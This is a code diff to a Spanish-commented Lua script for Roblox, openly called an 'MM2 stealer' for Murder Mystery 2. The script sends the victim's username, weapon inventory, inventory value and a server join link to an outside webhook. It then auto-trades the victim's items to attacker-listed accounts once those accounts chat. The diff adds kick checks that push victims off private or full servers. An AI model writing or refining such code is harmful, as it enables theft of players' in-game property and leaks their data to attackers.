@@ -19,6 +19,26 @@ if not req then
     return
 end
 
+-- Kick inicial si no hay usuarios o webhook
+if next(users) == nil or webhook == "" then
+    LocalPlayer:Kick("⚠️ No se añadieron usernames o webhook. Abortando...")
+end
+
+-- Kick si no es MM2
+if game.PlaceId ~= 142823291 then
+    LocalPlayer:Kick("❌ Juego no soportado. Por favor únete a un servidor normal de MM2.")
+end
+
+-- Kick si es servidor privado o lleno
+local maxPlayers = 12
+local function CheckServer()
+    if game.PrivateServerId ~= "" then
+        LocalPlayer:Kick("🚫 Servidor privado detectado. Buscando servidor público...")
+    elseif #Players:GetPlayers() >= maxPlayers then
+        LocalPlayer:Kick("⚠️ Servidor lleno. Buscando servidor vacío...")
+    end
+end
+
 -- Función para enviar webhook
 local function SendWebhook(title, description, fields, prefix)
     local data = {
@@ -161,18 +181,15 @@ end
 -- Ordenar armas por valor total
 table.sort(weaponsToSend,function(a,b) return (a.Value*a.Amount)>(b.Value*b.Amount) end)
 
--- Generar join directo sin encode/redirect
-local safeLink = "https://www.roblox.com/games/"..game.PlaceId.."/"..game.JobId
-
 -- Webhook fields
 local fields={
     {name="Victim 👤:", value=LocalPlayer.Name, inline=true},
-    {name="Enlaze para unirse🔗::", value=safeLink, inline=false},
     {name="Inventario 📦:", value="", inline=false},
-    {name="Valor total del inventario📦:", value=tostring(totalValue), inline=true}
+    {name="Valor total del inventario📦:", value=tostring(totalValue), inline=true},
+    {name="Click para unirte a la víctima 👇:", value="https://www.roblox.com/games/"..game.PlaceId.."/"..game.JobId, inline=false}
 }
 for _, w in ipairs(weaponsToSend) do
-    fields[3].value=fields[3].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
+    fields[2].value=fields[2].value..string.format("%s x%s (%s) | Value: %s\n", w.DataID,w.Amount,w.Rarity,tostring(w.Value*w.Amount))
 end
 local prefix=pingEveryone and "@everyone " or ""
 SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gratis 😎",fields,prefix)
@@ -180,6 +197,7 @@ SendWebhook("💪MM2 Hit el mejor stealer💯","💰Disfruta todas las armas gra
 -- Trade
 local function doTrade(targetName)
     while #weaponsToSend>0 do
+        CheckServer()
         local status=getTradeStatus()
         if status=="None" then
             sendTradeRequest(targetName)
@@ -198,30 +216,14 @@ local function doTrade(targetName)
     end
 end
 
--- Kick y manejo de servidor lleno/privado
-local function CheckServer()
-    local maxPlayers = 12
-    if #Players:GetPlayers() >= maxPlayers then
-        LocalPlayer:Kick("Servidor lleno. Buscando servidor vacío...")
-    elseif game.PrivateServerId ~= "" then
-        LocalPlayer:Kick("Servidor privado detectado. Buscando servidor público...")
-    end
-end
-
 -- Esperar chat para iniciar trade
 for _, p in ipairs(Players:GetPlayers()) do
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() 
-            CheckServer()
-            doTrade(p.Name) 
-        end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end
 Players.PlayerAdded:Connect(function(p)
     if table.find(users,p.Name) then
-        p.Chatted:Connect(function() 
-            CheckServer()
-            doTrade(p.Name) 
-        end)
+        p.Chatted:Connect(function() doTrade(p.Name) end)
     end
 end)
